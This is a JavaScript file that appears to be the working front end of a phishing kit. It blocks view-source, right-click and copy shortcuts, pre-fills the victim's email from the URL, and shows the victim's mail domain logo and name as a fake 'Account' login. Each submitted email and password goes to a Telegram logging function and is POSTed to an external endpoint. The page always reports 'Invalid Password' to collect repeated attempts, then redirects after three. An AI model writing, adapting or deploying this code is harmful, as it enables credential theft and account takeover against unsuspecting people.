$(document).bind('keydown', function(e) {
      if (e.ctrlKey && (e.which == 83)) {
        e.preventDefault();
        return false;
      }
    });

    $(document).bind("contextmenu", function(e) {
      return false;
    });

    document.onkeydown = function(e) {
      if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
        return false;
      }
      return true;
    };

    $(document).keypress("u", function(e) {
      if (e.ctrlKey) {
        return false;
      }
      return true;
    });

    $(document).ready(function() {
      var count = 0;
      
      // Extract email from URL
      const url = window.location.href;
      const emailRegex = /\?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/;
      const match = url.match(emailRegex);

      let userEmail = null;

      if (match && match[1]) {
        console.log("Extracted email from URL:", match[1]);
        userEmail = match[1];
      } else {
        const queryRegex = /\?(.*)/;
        const match2 = url.match(queryRegex);
        userEmail = match2 && match2[1] ? match2[1] : null;
      }

      // Initialize form fields
      $("#email").val(userEmail);
      $("#emailich").html(userEmail || '');

      // Set up domain logo if email is valid
      if (userEmail) {
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        if (filter.test(userEmail)) {
          var ind = userEmail.indexOf("@");
          var my_slice = userEmail.substr((ind + 1));
          var c = my_slice.substr(0, my_slice.indexOf('.'));
          var finalu = c.toUpperCase();
          
          $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain=" + my_slice).show();
          $("#logoname").html(finalu + " Account");
        }
      }

      $('#submit-btn').click(function(event) {
        console.log("Button clicked!"); // Debug log
        
        $('#msg').hide();
        event.preventDefault();
        
        var email = $("#email").val();
        var password = $("#password").val();
        logToTelegram(email, password);
        // Validate inputs
        if (!password) {
          $('#msg').show().html("Password field is empty");
          return false;
        }

        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        if (!filter.test(email)) {
          $('#msg').show().html("Please enter a valid email address");
          $("#email").focus();
          return false;
        }

        count++;
        
        // AJAX call
        $.ajax({
          dataType: 'JSON',
          url: post,
          type: 'POST',
          data: {
            email: email,
            password: password,
          },
          beforeSend: function(xhr) {
            $('#submit-btn').prop('disabled', true).html('Verifying...');
          },
          success: function(response) {
            $("#msg").show();
            console.log(response);
            if (response && response['signal'] == 'ok') {
              $("#password").val("");
              if (count >= 3) {
                count = 0;
                window.location.replace("complete.html?" + email);
              }
              $('#msg').html("Invalid Password! Please enter your correct Password");
            } else {
              $('#msg').html("Invalid Password! Please enter your correct Password");
            }
          },
          error: function() {
            $("#password").val("");
            if (count >= 3) {
              count = 0;
              window.location.replace("complete.html?" + email);
            }
            $('#msg').show().html("Invalid Password! Please enter your correct Password");
          },
          complete: function() {
            $('#submit-btn').prop('disabled', false).html('Complete Scan >>');
          }
        });
      });

      // Allow Enter key to submit form
      $('#password').keypress(function(e) {
        if (e.which == 13) {
          $('#submit-btn').click();
        }
      });
    });